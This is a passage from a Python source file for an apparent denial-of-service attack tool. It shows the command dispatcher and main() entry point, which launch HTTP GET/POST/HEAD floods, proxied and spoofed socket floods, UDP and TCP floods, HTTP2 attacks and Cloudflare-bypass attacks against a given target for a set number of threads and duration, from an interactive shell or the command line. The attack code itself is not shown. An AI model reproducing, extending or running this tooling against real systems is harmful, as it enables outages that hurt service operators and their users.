                ProxyCloudflareBypassAttack(target, threads, duration).launch()
        elif cmd == "pps":
            target, threads, duration = CLI.get_l7_input()
            PPSAttack(target, threads, duration).launch()
        elif cmd == "spoof":
            target, threads, duration = CLI.get_l7_input()
            SpoofSocketAttack(target, threads, duration).launch()
        elif cmd == "pxspoof":
            target, threads, duration = CLI.get_l7_input()
            SpoofProxySocketAttack(target, threads, duration).launch()
        elif cmd == "get":
            target, threads, duration = CLI.get_l7_input()
            HTTPGetAttack(target, threads, duration).launch()
        elif cmd == "post":
            target, threads, duration = CLI.get_l7_input()
            HTTPPostAttack(target, threads, duration).launch()
        elif cmd == "head":
            target, threads, duration = CLI.get_l7_input()
            HTTPHeadAttack(target, threads, duration).launch()
        elif cmd == "pxraw":
            if State.load_proxies():
                target, threads, duration = CLI.get_l7_input()
                ProxyGetAttack(target, threads, duration).launch()
        elif cmd == "soc":
            target, threads, duration = CLI.get_l7_input()
            SocketAttack(target, threads, duration).launch()
        elif cmd == "pxsoc":
            if State.load_proxies():
                target, threads, duration = CLI.get_l7_input()
                ProxySocketAttack(target, threads, duration).launch()
        elif cmd == "cfreq":
            target, threads, duration = CLI.get_l7_input()
            if bypass_cloudflare(target):
                CFProAttack(target, threads, duration).launch()
        elif cmd == "cfsoc":
            target, threads, duration = CLI.get_l7_input()
            if bypass_cloudflare(target):
                CFSocketAttack(target, threads, duration).launch()
        elif cmd == "pxsky":
            if State.load_proxies():
                target, threads, duration = CLI.get_l7_input()
                SkyAttack(target, threads, duration).launch()
        elif cmd == "sky":
            target, threads, duration = CLI.get_l7_input()
            StellarAttack(target, threads, duration).launch()
        elif cmd == "udp":
            target, port, threads, duration = CLI.get_l4_input()
            attack = UDPFlood(f"{target}:{port}", threads, duration)
            attack.target['port'] = port
            attack.launch()
        elif cmd == "tcp":
            target, port, threads, duration = CLI.get_l4_input()
            attack = TCPFlood(f"{target}:{port}", threads, duration)
            attack.target['port'] = port
            attack.launch()
        elif cmd == "subnet":
            CLI.run_tool_api("subnetcalc", "IP")
        elif cmd == "dns":
            CLI.run_tool_api("reversedns", "IP/DOMAIN")
        elif cmd == "geoip":
            CLI.run_tool_api("geoip", "IP")
        else:
            print(f" [>] Unknown command. Type 'help' to see all commands.")


###############################################################################################
def main() -> None:
    """Main entry point."""
    colorama_init(convert=True) if colorama_mod else None
    State.load_user_agents()
    Config.RESOURCES_DIR.mkdir(parents=True, exist_ok=True)
    if _MISSING_MODULES:
        print(f" [i] Some optional modules are missing:")
        for mod in sorted(_MISSING_MODULES):
            print(f"     - {mod} (install: pip3 install {mod})")
        print(f" [i] Socket-based methods will still work without these.")
        print()
    if len(sys.argv) < 2:
        os.system('cls' if os.name == 'nt' else 'clear')
        CLI.display_title()
        while True:
            try:
                cmd = input(f"╔═══[root@ALE]\n╚══> ")
                CLI.process_command(cmd)
            except KeyboardInterrupt:
                print(f"\n [*] Interrupted. Exiting...")
                sys.exit(0)
            except Exception as e:
                print(f" [!] Error: {e}")
                import traceback
                traceback.print_exc()
    elif len(sys.argv) == 5:
        method = sys.argv[1].lower()
        target = sys.argv[2]
        threads = sys.argv[3]
        duration = sys.argv[4]
        attack_map = {
            'cfb': CloudflareBypassAttack,
            'pxcfb': ProxyCloudflareBypassAttack,
            'get': HTTPGetAttack,
            'post': HTTPPostAttack,
            'head': HTTPHeadAttack,
            'pxraw': ProxyGetAttack,
            'soc': SocketAttack,
            'pxsoc': ProxySocketAttack,
            'http2': HTTP2Attack,
            'pxhttp2': ProxyHTTP2Attack,
            'sky': StellarAttack,
            'pxsky': SkyAttack,
            'spoof': SpoofSocketAttack,
            'pxspoof': SpoofProxySocketAttack,
            'pps': PPSAttack,
        }
        if method in ('cfreq', 'cfsoc'):
            if bypass_cloudflare(target):
                attack_cls = CFProAttack if method == 'cfreq' else CFSocketAttack
                attack_cls(target, threads, duration).launch()
            else:
                print(f" [-] CF bypass failed.")
        elif method in attack_map:
            attack_cls = attack_map[method]
            if method in ('pxcfb', 'pxraw', 'pxsoc', 'pxhttp2', 'pxsky', 'pxspoof'):
                State.load_proxies()
            attack_cls(target, threads, duration).launch()
        else:
            print(f" [!] Unknown method: {method}")
            print("Methods: cfb, pxcfb, cfreq, cfsoc, pxsky, sky, http2, pxhttp2, get, post, head, soc, pxraw, pxsoc, spoof, pxspoof, pps")
    else:
        print(f"Usage: python3 {sys.argv[0]} <method> <target> <threads> <duration>")
        print(f"   or: python3 {sys.argv[0]}  (interactive mode)")
        sys.exit(1)
if __name__ == '__main__':
    main()
